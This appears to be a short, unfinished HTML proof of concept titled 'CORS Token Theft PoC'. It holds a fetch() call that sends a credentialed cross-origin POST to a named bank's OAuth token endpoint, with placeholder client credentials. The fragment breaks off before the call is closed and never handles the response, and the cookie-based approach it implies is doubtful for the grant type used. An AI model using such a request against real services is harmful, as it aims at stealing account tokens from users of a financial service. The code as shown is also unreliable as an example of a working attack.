<html>

    <h2>CORS Token Theft PoC</h2>

      fetch("https://monzo.com/oauth2/token", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "grant_type=client_credentials&client_id=xxxx&client_secret=xxxx"
